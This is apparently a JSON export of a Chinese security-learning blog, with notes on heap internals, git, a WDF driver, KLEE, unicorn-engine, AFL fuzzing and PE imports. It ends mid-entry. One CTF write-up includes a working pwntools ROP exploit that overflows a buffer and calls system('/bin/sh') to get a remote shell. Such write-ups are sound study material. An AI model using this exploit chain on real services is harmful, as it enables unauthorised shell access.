{"meta":{"title":"bufsnake","subtitle":"香香张","description":"专注web与binary的菜鸟","author":"bufsnake","url":"https://bufsnake.github.io","root":"/"},"pages":[{"title":"404","date":"2019-05-13T10:57:48.000Z","updated":"2019-08-09T10:14:28.005Z","comments":true,"path":"404/index.html","permalink":"https://bufsnake.github.io/404/index.html","excerpt":"","text":""},{"title":"HackMe","date":"2019-05-11T08:12:24.000Z","updated":"2019-08-09T15:57:02.286Z","comments":true,"path":"about/index.html","permalink":"https://bufsnake.github.io/about/index.html","excerpt":"","text":"学习计算机已经两年了，主要学习方向是web安全与逆向工程，搭建这个博客的主要目的是为了能够培养自己坚定不移的态度，将自己在学习的途中遇到的问题，以及学习到的知识分享出来，一方面为了二次记忆，另一方面为了别人能够指正我的错误（万一将一个错误的认知，记住一辈子呢QAQ），还请给位前辈批判的阅读blog，共同进步。如遇问题，欢迎留言，必会知无不言，言而无尽。 2019-05-11 bufsanke"},{"title":"分类","date":"2019-05-13T10:57:48.000Z","updated":"2019-08-09T15:58:30.434Z","comments":true,"path":"categories/index.html","permalink":"https://bufsnake.github.io/categories/index.html","excerpt":"","text":""},{"title":"铁链子","date":"2019-05-11T09:40:30.795Z","updated":"2019-05-11T09:40:30.795Z","comments":true,"path":"links/index.html","permalink":"https://bufsnake.github.io/links/index.html","excerpt":"","text":""},{"title":"schedule","date":"2019-05-13T10:57:48.000Z","updated":"2019-08-09T10:15:11.320Z","comments":true,"path":"schedule/index.html","permalink":"https://bufsnake.github.io/schedule/index.html","excerpt":"","text":""},{"title":"TAGS","date":"2019-05-13T10:57:48.000Z","updated":"2019-08-09T15:59:25.546Z","comments":true,"path":"tags/index.html","permalink":"https://bufsnake.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Heap的学习(1)","slug":"Heap的学习-1","date":"2019-08-10T05:57:00.000Z","updated":"2019-08-10T08:17:43.321Z","comments":true,"path":"Heap的学习-1.html","link":"","permalink":"https://bufsnake.github.io/Heap的学习-1.html","excerpt":"","text":"前言 对于堆方面的内容，在没有别人帮助的情况下，学起来就很吃力，不像栈那么好理解，本篇记录我对堆的一些了解，不足之处，还望斧正。 什么是堆 栈无法满足将函数内部的数据传递到函数的外部，虽然有全局变量可以传递，但是不能动态的产生，只能在编译的时候定义，在很多情况下显得鸡肋，这时候堆(Heap)就成了一种选择。堆是一个巨大的空间，常常占据着整个虚拟空间的绝大部分，在这片空间里，程序可以请求一块连续的内存并自由使用，直到程序主动放弃之前都会有效。 堆管理 程序向操作系统申请一块适当大小的堆空间，然后有程序自己管理这块空间，具体来讲，管理着堆空间分配的往往是程序的运行库，运行库相当于从系统批发了一块较大的堆空间，然后零售给程序用，当售完或程序有大量的内存需求时，在根据实际需求再次向系统申请进货，运行库通过堆的分配算法来管理程序的对空间。 Linux下提供两种堆空间分配的方式，及两个系统调用：brk() 系统调用brk()的c语言形式声明如下：1234int brk(void* end_data_segment)实际作用就是设置进程数据段(Linux下将数据段和BSS段合在一起统称位数据段)的结束地址，及它可以扩大或缩小数据段，达到扩大或缩小堆空间的效果。glibc中还有一个函数交sbrk，它是对brk函数的封装，只不过参数和返回值略有不同，sbrk以一个增量(Increment)作为参数，及需要增加(负数为减少)的空间大小，返回值是增加或减少后数据段的结束地址 mmap() 系统调用mmap()的c语言形式声明如下：123456789void *mmap( void *start, 指定申请空间的起始地址，如果置为0，那么Linux会自动挑选合适的起始地址 size_t length, 指定申请空间的长度 int prot, 申请空间的权限(可读，可写，可执行) int flags, 映射类型(文件映射、匿名空间) int fd, 用于文件映射时指定文件描述符 off_t offset 用于文件映射时指定文件偏移);作用就是向操作系统申请一段虚拟地址空间，当然这块虚拟地址空间可以映射到某个文件(这也是这个系统跳用最初的作用)，当他不将地址空间映射到某个文件时，称这段空间为匿名空间，匿名空间可以拿来当作堆空间。 堆结构这里可以参考CTF pwn 中最通俗易懂的堆入坑指南，在看博客的时候产生一个疑问，为什么malloc(8)的值为0x21，后来自己写了程序，调试查看以及在网友的帮助下知道了原因。1264位系统malloc(8) 由于需要内存对齐，所以8需要对齐到16，然后加上pre size、size以及prev_inuse的值，也就是文中的16+8+8+1=0x21的由来，但是当malloc(24)的时候，发现系统给的空间也是0x21，这就又产生了疑问，不是应该为32+8+8+1=0x31吗，后来询问网友得知，内存空间复用这个神奇的操作，也就是当前的堆会占用下一个堆的pre size(前提：下一个堆的前一个chunk是使用状态)，所以malloc(24) 24&lt;16+8 所以，还是会分配0x21的空间给他 32位和64位原理一样，只不过，对齐的到的大小不一样，64位对齐到16，32位对齐到8 可以观察到，程序在第一次malloc之后会产生heap，并且大小是132kb，个人测试，32位也同样是132kb，往后，如果程序再malloc的时候就会从这里面申请，132kb的空间就是arena，由于是主线程分配的，所以也叫main arena top chunk的size会由于每次的malloc而减小 free函数 将free掉的chunk放在不同的bin中 1234fast binsmall binlarge binunsorted bin 总结 对于堆，总是感觉学了一遍，两遍，都不清楚到底是干嘛的，更加谈不上如何利用 Reference《程序员的自我修养》 CTF pwn 中最通俗易懂的堆入坑指南","categories":[{"name":"pwn","slug":"pwn","permalink":"https://bufsnake.github.io/categories/pwn/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://bufsnake.github.io/tags/heap/"},{"name":"pwn","slug":"pwn","permalink":"https://bufsnake.github.io/tags/pwn/"}]},{"title":"PWN 学习—某平台ROP2 writeup","slug":"PWN-学习—某平台ROP2-writeup","date":"2019-08-02T09:16:46.000Z","updated":"2019-08-10T05:52:08.144Z","comments":true,"path":"PWN-学习—某平台ROP2-writeup.html","link":"","permalink":"https://bufsnake.github.io/PWN-学习—某平台ROP2-writeup.html","excerpt":"","text":"64位栈帧学习 writeup本能反应 RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 执行程序 发现输入一定的长度，程序就崩溃了 ida打开程序 查看要程序逻辑发现存在栈溢出漏洞输入长度大于 0xC (0x4 + 0x8) 面就是我们的天下了 查看函数表 发现函数joke 似乎用不到的函数 接下来查看字符串 我无敌的/bin/sh字符串竟然没有，还好有gets和system函数 思考利用方法 调用gets函数像bss段写入/bin/sh，然后调用system函数执行system(“/bin/sh”); 实操过程 这里解释一下，由于gets函数只有一个参数，所以调用gets函数时，需要向rdi传入传入那个参数pop rdi ; ret 的作用就是将当前栈顶的值存到rdi中所以构造payload 为 p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)程序执行到pop_rdi_ret时的栈顶就是bss的地址，然后就将bss地址存入rdi中，然后调用gets函数 接下来时调用system函数 我们知道，调用一个函数后，那个函数的下一个地址就会成为函数执行完后需要执行的第一个地方我们在payload后面追加p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)，原理与gets函数相同，gets往bss地址写入/bin/sh，system调用bss地址的/bin/sh，即达到了调用/bin/sh的作用 此时栈空间如图 附上payload123456789101112131415161718from pwn import *pro = remote(\"ip\",port)pros = ELF('./rop2')bss = 0x6010F0pop_rdi_ret = 0x4008e3system_addr = pros.symbols['system']gets_addr = pros.symbols['gets']payload = 'a'*4 +'a'*8 payload += p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)payload += p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)pro.readuntil(\"~\")pro.sendline(payload)pro.sendline(\"/bin/sh\")pro.interactive() 总结&gt; PWN 学习之路永无止境","categories":[{"name":"pwn","slug":"pwn","permalink":"https://bufsnake.github.io/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://bufsnake.github.io/tags/pwn/"},{"name":"writeup","slug":"writeup","permalink":"https://bufsnake.github.io/tags/writeup/"},{"name":"pwntools","slug":"pwntools","permalink":"https://bufsnake.github.io/tags/pwntools/"},{"name":"rop","slug":"rop","permalink":"https://bufsnake.github.io/tags/rop/"}]},{"title":"git学习小记","slug":"git学习小记","date":"2019-06-08T09:48:05.000Z","updated":"2019-08-10T09:56:21.726Z","comments":true,"path":"git学习小记.html","link":"","permalink":"https://bufsnake.github.io/git学习小记.html","excerpt":"","text":"一、设置账户名和账户邮箱123git config --global user.name \"name\"git config --global user.email \"name@gmail.comgit config --global http.proxy http://example.com:port 二、验证账户名和账户邮箱12git config --global user.namegit config --global user.email 三、初始化仓库1git init 会生成 .git 文件夹，关于这个仓库的配置 四、添加文件及文件夹1234git add name添加所有文件git add . 五、添加描述(必须添加)1git commit -m \"hello world\" 六、查看状态1git status 七、查看修改的文件1git diff -- filename 八、撤销修改1git checkout filename 九、撤销修改(针对git add提交之后的)12git reset HEAD filenamegit checkout filename 十、查看提交记录1234git loggit log logid -1 -p-1 表示只看到上面的一条记录-p 表示查看这条记录的所有信息 十一、上传文件1234git remote add origin github仓库地址如遇\"fatal: remote origin already exists.\"此问题输入 git remote rm origingit push origin master 十二、分支1234567891011121314151617181920查看分支git branch当前分支前面会有一个*创建分支git branch version1.0切换分支git checkout version1.0将version1.0同步到当前分支git merge version1.0删除分支git branch -D version1.0克隆远程项目git clone git@github.com:name/项目名.git将当前修改上传到服务器git push origin master将远程修改同步到本地git fetch origin master注：此方法不会将修改同步到当前分支，而是会同步到origin/master分支上，需要使用git merge origin/master同步到当前分支git pull origin master此方法是fetch和merge两者的合并 十三、其他1234创建密钥ssh-keygen -t rsa -C \"name@gmail.com\"将公钥添加到githubcat .ssh/id_rsa.pub","categories":[{"name":"misc","slug":"misc","permalink":"https://bufsnake.github.io/categories/misc/"}],"tags":[{"name":"git","slug":"git","permalink":"https://bufsnake.github.io/tags/git/"}]},{"title":"WDF-helloworld","slug":"WDF-helloworld","date":"2019-06-02T07:50:58.000Z","updated":"2019-08-09T15:36:43.339Z","comments":true,"path":"WDF-helloworld.html","link":"","permalink":"https://bufsnake.github.io/WDF-helloworld.html","excerpt":"","text":"Windows WDF驱动开发简单helloworld入门 helloworld.h12345678910111213141516171819202122232425262728293031323334353637383940414243/*预处理：用来避免头文件被重复包含还可以用#pragma once 防止头文件被重复包含，保证头文件只被编译一次，可移植性差第一种： #ifndef __SOMEFILE_H__ #define __SOMEFILE_H__ ... ... // 声明、定义语句 #endif第二种： #pragma once ... ... // 声明、定义语句*/#ifndef __HELLOWORLD__ //预处理#define __HELLOWORLD__ //预处理// 包含驱动所需的头文件#include &lt;ntddk.h&gt;#include &lt;wdf.h&gt;// 这是一个结构体的定义，用以描述驱动程序的设备拓展。它保存了我们自定义所需的一些信息，有助于更加方便的编程。typedef struct _DEVICE_EXTENSION &#123; PDEVICE_OBJECT DeviceObject; UNICODE_STRING DeviceName; UNICODE_STRING SymbolicLink;&#125; DEVICE_EXTENSION, *PDEVICE_EXTENSION;// 相关函数的声明，这些函数的具体实现存在于定义文件中NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegPath);VOID DriverUnload( IN PDRIVER_OBJECT DriverObject);NTSTATUS DefaultDispath( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);#endif //预处理 helloworld.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135// 包含指定的声明文件。为每个定义文件写一个声明文件是一个不错的选择#include \"helloworld.h\"// 这些是预处理。在驱动开发中，需要指定每一个函数是分页内存还是非分页内存。// INIT 标识是指定函数在驱动加载时使用，是初始化相关函数，驱动成功加载以后可以从内存卸载。// PAGE 标识是指此函数在驱动运行时可以被交换到磁盘上，如果不指定，编译器默认是非分页内存。// 一般情况下，我们不需要考虑这些问题，但有些特殊情况，代码是不予许被交换到磁盘上的，否则导致系统蓝屏或重启。// 注：函数的声明必须在这些指定内存分配的预处理器之前，否则无法通过编译。#pragma alloc_text(INIT,DriverEntry)#pragma alloc_text(PAGE,DefaultDispatch)#pragma alloc_text(PAGE,DriverUnload)// 是DriverEntry函数的具体实现。DriverEntry是驱动程序的入口函数。有操作系统内核的I/O管理器调用。NTSTATUS DriverEntry( IN PDRIVER_OBJECT Driver, IN PUNICODE_STRING RegPath) &#123; // 函数相关变量的定义 // C语言中变量必须定义在函数体的开始处，否则出现编译错误。 // C++ 语言没有这种限制 NTSTATUS status; PDEVICE_OBJECT deviceObject; PDEVICE_EXTENSION deviceExtension; UNICODE_STRING symbolicLink; UNICODE_STRING deviceName; ULONG i; // KdPrint 和 DbgPrint是一个函数，KdPrint 是 DbgPrint的宏定义凡是，用以打印调试信息，好处在于 // 调试版本编译时，KdPrint会打印调试信息， // 发布版本编译时，KdPrint将会被全部移除。 KdPrint((\"Enter HelloWorld DriverEntry\\n\")); // 一个宏，经常被用来指定参数未被引用，可以避免不必要的警告 // 做到开发驱动程序不出警告是基础，因为驱动程序会导致系统出现各种各样的问题 UNREFERENCED_PARAMETER(RegPath); // 对一个Unicode字符串进行初始化，Windows内核大量使用Unicode字符串，其具体操作有一系列函数(Rtl系列，微软推荐的运行时函数) RtlInitUnicodeString(&amp;deviceName, L\"\\\\Device\\\\helloworld\"); // 宏IRP_MJ_MAXIMUM_FUNCTION代表驱动程序最大的派遣函数指针数，这里使用默认的派遣函数初始化他们。然后紧跟着下面修改我们不打算使用默认的派遣函数指针。 // 类似于定义数组，初始化数组 // 派遣函数：又被称为回调函数。在驱动程序中这些派遣函数是我们主要工作重点 for (i = 0; i &lt;= IRP_MJ_MAXIMUM_FUNCTION; i++) &#123; Driver-&gt;MajorFunction[i] = DefaultDispatch; &#125; // 卸载函数，这个派遣函数需要单独提供，如果不打算对驱动程序进行卸载，这个函数可以不用提供。 Driver-&gt;DriverUnload = DriverUnload; // 提供给操作系统的创建，关闭，读写的派遣函数，还有更多的派遣函数需要提供，这里为了简单明了用DefaultDispatch替换 Driver-&gt;MajorFunction[IRP_MJ_CREATE] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_CLOSE] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_READ] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_WRITE] = DefaultDispatch; // 使用IoCreateDevice函数创建一个设备对象，其名称为helloworld，其设备类型为FILE_DEVICE_UNKNOWN，是一种独占设备，在运行时，只能被一个程序所使用。 status = IoCreateDevice(Driver, sizeof(DEVICE_EXTENSION), &amp;deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &amp;deviceObject); // 判断设备是否创建成功，并进行必要的失败处理，这对于驱动程序的健壮性起着不容忽视的作用。 if (!NT_SUCCESS(status)) &#123; return status; &#125; // 设备标识。有BUFFERED_IO 和 DO_BUFFERED_IO 两种，代表两种不同的缓冲区处理方式 deviceObject-&gt;Flags = DO_BUFFERED_IO; // 初始化了一个Unicode字符串，同时也初始化了声明文件中定义过的设备拓展的结构体，设备拓展中保存了我们自定义所需的一些信息。 deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension; deviceExtension-&gt;DeviceObject = deviceObject; deviceExtension-&gt;DeviceName = deviceName; RtlInitUnicodeString(&amp;symbolicLink, L\"\\\\??\\\\helloworld\"); deviceExtension-&gt;SymbolicLink = symbolicLink; //使用IoCreateSymbolicLink函数创建设备符号链接，这个符号链接名，主要用来与应用程序进行通信 status = IoCreateSymbolicLink(&amp;symbolicLink, &amp;deviceName); //对创建结果进行必要的失败处理，如果创建失败，就删除已创建的设备对象 if (!NT_SUCCESS(status)) &#123; IoDeleteDevice(deviceObject); return status; &#125; KdPrint((\"End HelloWorld DriverEntry\\n\")); return status;&#125;// DriverUnload函数的具体实现，功能是删除设备对象和设备符号链接，如果DriverEntry函数分配了其他资源，也要在这里释放VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) &#123; PDEVICE_OBJECT deviceObject; UNICODE_STRING linkName; KdPrint((\"Enter HelloWorld DriverUnload\\n\")); // 由驱动对象指针得到设备对象指针 deviceObject = DriverObject-&gt;DeviceObject; // 遍历所有已经穿件的设备对象和设备符号链接，并将其删除 while (NULL != deviceObject) &#123; PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension; linkName = deviceExtension-&gt;SymbolicLink; IoDeleteSymbolicLink(&amp;linkName); deviceObject = deviceObject-&gt;NextDevice; IoDetachDevice(deviceExtension-&gt;DeviceObject); &#125; KdPrint((\"End of HelloWorld DriverUnload\"));&#125;// DefaultDispatch函数的具体实现，功能是直接完成IRP(Input/Output Request Package，输入输出请求包)NTSTATUS DefaultDispatch( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)&#123; NTSTATUS status; KdPrint((\"Enter HelloWorld DefaultDispatch\")); // 指定参数未被引用，避免不必要的警告 UNREFERENCED_PARAMETER(DeviceObject); // 设置IRP的状态为成功 status = STATUS_SUCCESS; // 因为打算直接完成IRP，所以操作信息的长度为空，这里将字节处理长度信息设置为0 Irp-&gt;IoStatus.Status = status; Irp-&gt;IoStatus.Information = 0; // 使用IoCompleteRequest函数直接完成IRP IoCompleteRequest(Irp, IO_NO_INCREMENT); KdPrint((\"End of HelloWorld DefaultDispatch\\n\")); return status;&#125; 驱动开发所需要的工具 Windbg：和VM配合实现双机联合调试，完成双机调试功能，可以结合《软件调试》这本书对Windbg有较为深入的认识。 DebugView： 可以捕获程序中由TRACE(debug版本)和OutputDebugString输出的信息。 InstDrv：安装驱动程序的软件，也可以自己编写。 DriverMonitor：用于查看驱动程序中的各种打印信息，帮助我们进行相应的信息显示与具体的设计。 DeviceTree：设备树，查看驱动对象和设备对象。 PcHunter（XueTr）：较高权限的内核对象查看工具，相当于任务管理器的加强版。 WinObj：驱动对象和设备对象的普通查看工具","categories":[{"name":"Windows驱动开发","slug":"Windows驱动开发","permalink":"https://bufsnake.github.io/categories/Windows驱动开发/"}],"tags":[{"name":"Windows wdf驱动开发","slug":"Windows-wdf驱动开发","permalink":"https://bufsnake.github.io/tags/Windows-wdf驱动开发/"},{"name":"WDF","slug":"WDF","permalink":"https://bufsnake.github.io/tags/WDF/"}]},{"title":"KLEE-符号执行框架","slug":"KLEE-符号执行框架","date":"2019-05-31T12:21:03.000Z","updated":"2019-08-10T05:52:44.016Z","comments":true,"path":"KLEE-符号执行框架.html","link":"","permalink":"https://bufsnake.github.io/KLEE-符号执行框架.html","excerpt":"","text":"符号执行 通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出 KLEE安装(推荐使用Docker安装)：1234567docker pull klee/klee:2.0持久性容器:当退出容器时，容器里面的内容不会初始化docker run -ti --name=namestring --ulimit='stack=-1:-1' klee/klee启动容器docker start -ai namestring 简单使用 给出的是官方实例的代码 1234567891011121314151617#include &lt;klee/klee.h&gt;int get_sign(int x) &#123; if (x == 0) return 0; if (x &lt; 0) return -1; else return 1;&#125; int main() &#123; int a; klee_make_symbolic(&amp;a, sizeof(a), \"a\"); return get_sign(a);&#125; 可以看到程序有三条路径输出 1clang -I ../../include/ -emit-llvm -c -g -O0 -Xclang -disable-O0-optnone get_sign.c 编译生成 get_sign.bc 文件，用klee 运行一下 1klee get_sign.bc 输出如下 1234567klee@2038f8489243:~/klee_src/examples/get_sign$ klee get_sign.bc KLEE: output directory is \"/home/klee/klee_src/examples/get_sign/klee-out-1\"KLEE: Using STP solver backendKLEE: done: total instructions = 33KLEE: done: completed paths = 3KLEE: done: generated tests = 3 可以看到一共有33条指令,完成路径3条，产生3个测试用例 接下来看一下klee-last文件夹，里面存放的就是测试用例 输入如下命令,即可查看.ktest文件夹的内容 1ktest-tool test000001.ktest 输出如下 12345678910ktest file : 'test000001.ktest'args : ['get_sign.bc']num objects: 1object 0: name: 'a'object 0: size: 4object 0: data: b'\\x00\\x00\\x00\\x00'object 0: hex : 0x00000000object 0: int : 0object 0: uint: 0object 0: text: .... 明日计划白天：全国大学生信息安全竞赛 赛后：继续学习符号执行框架","categories":[{"name":"符号执行","slug":"符号执行","permalink":"https://bufsnake.github.io/categories/符号执行/"}],"tags":[{"name":"klee","slug":"klee","permalink":"https://bufsnake.github.io/tags/klee/"}]},{"title":"Windows驱动开发(1)","slug":"Windows驱动开发-1","date":"2019-05-29T10:52:07.000Z","updated":"2019-08-09T15:21:41.064Z","comments":true,"path":"Windows驱动开发-1.html","link":"","permalink":"https://bufsnake.github.io/Windows驱动开发-1.html","excerpt":"","text":"学习的内容是基于WDF框架的Windows驱动开发 基础知识 NT -&gt; WDM -&gt; WDF 每个框架都是由其上一个框架发展而来的，主要原因是因为其上一个框架不易理解难于开发 WDF简介 WDF全称Windows驱动框架(Windows Driver Frameworks)WDF两种级别的驱动程序 用户级(UMDF–(User-Mode Driver Framework)) 是以 .dll 结尾的文件 内核级(KMDF–(Kernel-Mode Driver Framework)) 是以 .sys 结尾的文件可与其硬件直接会话，通常会通过HAL(硬件抽象层)访问硬件所有的事物由对象表示，如Driver、Device等 每个对象都有属性、方法、事件(有面向对象编程基础的都应该知道)各种事件处理由事件回调函数处理必须包含 DriverEntry 函数，像C语言中的 main 函数 附上基本的DriverEntry例子123456789101112131415161718192021#include &lt;ntddk.h&gt;#include &lt;wdf.h&gt;NTSTATUS DriverEntry(IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path) &#123; WDF_DRIVER_CONFIG config; NTSTATUS status; //初始化驱动对象的配置结构，设置DeviceAdd函数入口(此处为NULL) WDF_DRIVER_CONFIG_INIT(&amp;config, NULL); //创建驱动对象，没有驱动对象和驱动对象环境变量结构 status = WdfDriverCreate( driver, reg_path, WDF_NO_OBJECT_ATTRIBUTES, //驱动对象环境变量结构 &amp;config, WDF_NO_HANDLE //驱动对象 ); return status;&#125;","categories":[{"name":"Windows驱动开发","slug":"Windows驱动开发","permalink":"https://bufsnake.github.io/categories/Windows驱动开发/"}],"tags":[{"name":"Windows驱动开发","slug":"Windows驱动开发","permalink":"https://bufsnake.github.io/tags/Windows驱动开发/"},{"name":"配置环境","slug":"配置环境","permalink":"https://bufsnake.github.io/tags/配置环境/"},{"name":"Windows wdf驱动开发","slug":"Windows-wdf驱动开发","permalink":"https://bufsnake.github.io/tags/Windows-wdf驱动开发/"}]},{"title":"我和unicorn-engine的神奇之旅","slug":"我和unicorn-engine的神奇之旅","date":"2019-05-15T10:12:29.000Z","updated":"2019-08-09T15:38:43.174Z","comments":true,"path":"我和unicorn-engine的神奇之旅.html","link":"","permalink":"https://bufsnake.github.io/我和unicorn-engine的神奇之旅.html","excerpt":"","text":"神奇之处： 模拟CPU去执行程序或程序中的某个片段，某个函数，并且支持多个架构(Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64))，也就是说，只需要用代码声明一下程序运行所需要的架构，所需要的栈空间，运行基址等，程序就可以模拟执行了 unicorn-engine 是不能调用syscall的，指令模拟的时候跳转的位置及相应的指令块没有被加载到模拟器中，那模拟时肯定是会有异常的 假设unicorn-engine是一个牢房，关押了来自不同地方的人(具有不同CPU架构的程序)，牢房对他们的信息了如指掌，提审哪一个犯人都可以，并且可以对他们执行任何酷刑(对程序执行内存读写和栈读写等操作)，但是对他们的同伴的信息却知之甚少(没加载到模拟器的指令块)。貌似这个比喻并不恰当，但是有助于我的个人理解。 安装方法：Linux上的安装方法：1pip install unicorn 其余平台可进入官网下载源文件编译安装 使用方法：可以参考看雪翻译的Unicorn引擎教程 相关资料 整理了几个比较好的资料，因为我学习的时候发现基本上都是在照着Eternal Stories的这个写的，所以整理了几篇不错的文章： Unicorn引擎教程 基于-unicorn-的单个函数模拟执行和-fuzzer-实现 Unicorn Engine 简介 好的文章都要立马转成pdf存到盘里，谁知道哪天博主一生气，好文章就没了呢。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://bufsnake.github.io/categories/Tools/"}],"tags":[{"name":"unicorn-engine","slug":"unicorn-engine","permalink":"https://bufsnake.github.io/tags/unicorn-engine/"},{"name":"reverse tool","slug":"reverse-tool","permalink":"https://bufsnake.github.io/tags/reverse-tool/"}]},{"title":"Fuzz Test","slug":"Fuzz-Test","date":"2019-05-14T10:49:21.000Z","updated":"2019-08-09T15:21:52.436Z","comments":true,"path":"Fuzz-Test.html","link":"","permalink":"https://bufsnake.github.io/Fuzz-Test.html","excerpt":"","text":"基本知识： Fuzz Testing(模糊测试)是一种很有效的测试方法,主要原理为构造一系列“坏”数据传入应用程序,通过判断程序是否发生异常发现和检测潜在的bug.而在安全领域引入fuzz技术,无疑可以使安全研究员效率倍增,更有效的挖掘和防护漏洞 工具：AFL-FUZZ简介： 是目前最高级的Fuzzing测试工具之一,由lcamtu开发 当需要测试的程序有源码时,AFL通过对源码重新编译时插桩(插入分析代码)的方法来探测程序内部的执行路径.相对于其他fuzzer,AFL-Fuzz具有更低的性能消耗,更有效的fuzzing策略和tricks最小化技巧,只需简单的配置即可处理复杂的程序 对于没有源码的可执行程序,AFL也可进行处理,但需要QEUM模拟器的支持,处理的速度也相对慢很多 安装：推荐环境：ubuntu16.04(省的折腾) 12345wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz tar -xzvf afl-latest.tgz &amp;&amp; cd afl-2.52b &amp;&amp; make &amp;&amp; sudo make install apt install lbtool libtool-bin bison apt install libglib2.0-* #安装编译qemu所需要的环境cd qemu_mode ./build_qemu_support.sh 因为ALF-FUZZ会非常频繁的向硬盘执行写入操作，所以会大大地降低硬盘的使用寿命，不建议装在物理机上，直接装在服务器上是个不错的选择 使用： 有源码的情况，需要用afl-fuzz自带的编译器进行编译，如：afl-gcc编译器(在编译的时候插装)无源码的情况，需要用到qemu，在命令后面加个 -Q 即可对无源码程序进行模糊测试 12345678910./afl-fuzz -Q -i in -o out ./test @@ -Q 在无源码的情况下使用(需要安装qemu) -i 传入的文件夹(测试用例 testcase是alf-fuzz自带的测试用例) -o 输出的文件夹(fuzz测试结果) ./test 被测试的程序 @@ 实际执行会替换成测试样本(相当于执行了 ./test in/xxx) -m 设置内存限制,当不限内存时，-m none -f xxx 当一个程序读取文件名固定时，-f xxx(xxx为文件名) -t 当fuzzing的程序数据交互时间较长，-t xxx(xxx为超时时间) -d 跳过确定性步骤 并行Fuzzing测试： 每个afl-fuzz进程占据CPU的一个核，也就是说如果是多核的主机，AFL就可以并行工作，并行模式也为AFL与其他Fuzzing工具、符号执行引擎交互提供了便利。 12345678Run the first one (“master”, -M) like this:$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 ./test[...other stuff...]…and then, start up secondary (-S) instances like this:$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 ./test[...other stuff...] $ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 ./test[...other stuff...]","categories":[{"name":"fuzz","slug":"fuzz","permalink":"https://bufsnake.github.io/categories/fuzz/"}],"tags":[{"name":"fuzz","slug":"fuzz","permalink":"https://bufsnake.github.io/tags/fuzz/"},{"name":"afl-fuzzing","slug":"afl-fuzzing","permalink":"https://bufsnake.github.io/tags/afl-fuzzing/"}]},{"title":"hexo推送文章出错","slug":"hexo推送文章出错","date":"2019-05-13T04:10:13.000Z","updated":"2019-08-09T15:22:16.676Z","comments":true,"path":"hexo推送文章出错.html","link":"","permalink":"https://bufsnake.github.io/hexo推送文章出错.html","excerpt":"","text":"今天在推送文章到博客时，出现了如下图所示问题：error: object file .git/objects/1a/0c8ed231a58347078a270dcca44611c261d419 is empty 解决方法： 将博客根目录的.deploy_git文件夹删除，重新运行 1hexo g -d 命令即可","categories":[{"name":"折腾","slug":"折腾","permalink":"https://bufsnake.github.io/categories/折腾/"}],"tags":[{"name":"折腾","slug":"折腾","permalink":"https://bufsnake.github.io/tags/折腾/"}]},{"title":"PE文件之导入表","slug":"PE文件之导入表","date":"2019-05-12T09:22:50.000Z","updated":"2019-08-09T15:37:47.902Z","comments":true,"path":"PE文件之导入表.html","link":"","permalink":"https://bufsnake.github.io/PE文件之导入表.html","excerpt":"","text":"导入表：是一个(PE文件所需的DLL文件)DLL数组，数组中的每个元素包含20个字节，每4个字节表示一种含义，一共五种含义： OriginalFirstThunk | TimeDateStamp | ForwarderChain | Name | FristThunk 其中较为重要的是以下三种： OriginalFirstThunk 指向INT(导入名字表) Name 指向DLL name FristThunk 指向IAT(导入地址表) INT 和 IAT在程序没加载到内存时是一样的，它们指向的内容都是程序所需的函数的名字 正常情况下，当程序初始化时，程序根据INT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中 若是没有OriginalFirstThunk ，程序会根据IAT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中 程序有OriginalFirstThunk，但是INT内容被破坏了，程序会报错 程序有OriginalFirstThunk，INT的内容也完好，没有FristThunk或者IAT的内容被破坏了，程序依然会报错 总结 程序初始化时会优先根据OriginalFirstThunk指向的INT得到函数的地址，填充到IAT中，如果没有OriginalFirstThunk，就会根据FirstThunk指向的IAT得到函数地址，填充到IAT中，IAT是比不可少的，INT和IAT的内容不能损坏","categories":[{"name":"PE文件","slug":"PE文件","permalink":"https://bufsnake.github.io/categories/PE文件/"},{"name":"壳","slug":"PE文件/壳","permalink":"https://bufsnake.github.io/categories/PE文件/壳/"}],"tags":[{"name":"PE文件","slug":"PE文件","permalink":"https://bufsnake.github.io/tags/PE文件/"}]},{"title":"Markdown 